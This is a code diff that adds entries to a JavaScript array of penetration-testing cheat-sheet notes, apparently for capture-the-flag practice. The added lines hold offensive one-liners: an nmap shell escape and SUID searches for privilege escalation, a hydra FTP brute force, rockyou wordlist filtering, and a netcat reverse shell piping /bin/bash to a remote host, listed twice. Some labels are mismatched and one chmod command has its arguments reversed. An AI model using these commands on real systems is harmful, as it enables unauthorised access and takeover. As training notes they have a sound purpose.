@@ -30,6 +30,61 @@ const mynotes = [
         "notes": "<h4>gobuster</h4><code>gobuster dns -d example.com -w word_list.txt</code><br><h4>subbrute</h4><code>python3 subbrute.py -p example.com -c 16</code><br><p>-p : optional (DNS records)<br>-c : threads (max 16)</p><br> <h4>subfinder</h4><code>subfinder -d example.com</code><br><h4>assetfinder</h4><code>assetfinder --subs-only example.com</code><br><br>",
         "description": "subdomain, enum"
     },
+    {
+        "header": "privilege escalation",
+        "notes": "<h4>nmap privilege escalation</h4><code>nmap --interactive</code><br><code>nmap>!sh</code> <br><br>",
+        "description": "subdomain, enum"
+    },
+    {
+        "header": "privilege escalation find SUID files",
+        "notes": "<h4>find SUID (find command for get privilege)</h4><code>find / -perm -u=s -type f 2>/dev/null</code> <br><br><code>find / -perm -g=s -type f 2>/dev/null</code><br><br><code>find / -perm -g=s -o -perm -u=s -type f 2>/dev/null</code><br><br><code>find /home -writable -type d 2>/dev/null</code><br><br><code>find . -type f -perm 0777 -print</code><br><br>",
+        "description": "privilege escalation, find ,suid ,super user"
+    },
+    {
+        "header": "install .tar file in linux",
+        "notes": "<h4>install .tar</h4><code>tar -xvf filename.tar</code><br><br>",
+        "description": "install , tar , linux ,kali linux"
+    },
+    {
+        "header": "Sort private bugbounty program",
+        "notes": "<h4>sort private bugbounty</h4><code>inurl: /bugbounty insite:lk</code><br><br>",
+        "description": "sort,private,bugbounty,google,dorks"
+    },
+    {
+        "header": "upgrading pty with python",
+        "notes": "<h4>python pty</h4><code>python -c 'import pty;pty.spawn('/bin/bash')'</code><br><br>",
+        "description": "upgrading, tty, pty, putty"
+    },
+    {
+        "header": "FTP bruteforce with hydra",
+        "notes": "<h4>ftp bruteforce</h4><code>hydra -l uname -P rockyou.txt ftp://10.10.9.10</code><br><br>",
+        "description": "hydra, ftp, bruteforce"
+    },
+    {
+        "header": "filter wordlist, sorting wordlist",
+        "notes": "<h4>ftp bruteforce</h4><code>grep -E '^.{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</code><br><br><code>grep -E '^[[:alnum:]]{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</code><br><br><code>grep -E '^[[:alpha:]]{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</code><br><br><code>grep -E '^[[:upper:]]{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</code><br><br><code>grep -E '^[[:lower:]]{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</code><br><br><code>grep -E '^[[:digit:]]{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</code><br><br>",
+        "description": "filter, sorting, wordlist, rockyou, grep -E"
+    },
+    {
+        "header": "Python HTTP server",
+        "notes": "<h4>start python http server</h4><code>python -m http.server port_num</code><br><br>",
+        "description": "python, http, server"
+    },
+    {
+        "header": "Connect with SSH key",
+        "notes": "<h4>connect with ssh</h4><code>chmod id_rsa 600</code><br><br><code>ssh user@<ip_add> -i id_rsa</code>",
+        "description": "connect, ssh, sshkey, id_rsa,rce, reverse shell"
+    },
+    {
+        "header": "Netcat remote access",
+        "notes": "<h4>netcat</h4><code>nc  host  port  -e  /bin/bash</code><br><br>",
+        "description": "netcat, remote, access, /bin/bash , shell"
+    },
+    {
+        "header": "Netcat remote access",
+        "notes": "<h4>netcat</h4><code>nc  host  port  -e  /bin/bash</code><br><br>",
+        "description": "netcat, remote, access, /bin/bash , shell"
+    },
     // Add more data here...
   ];
   
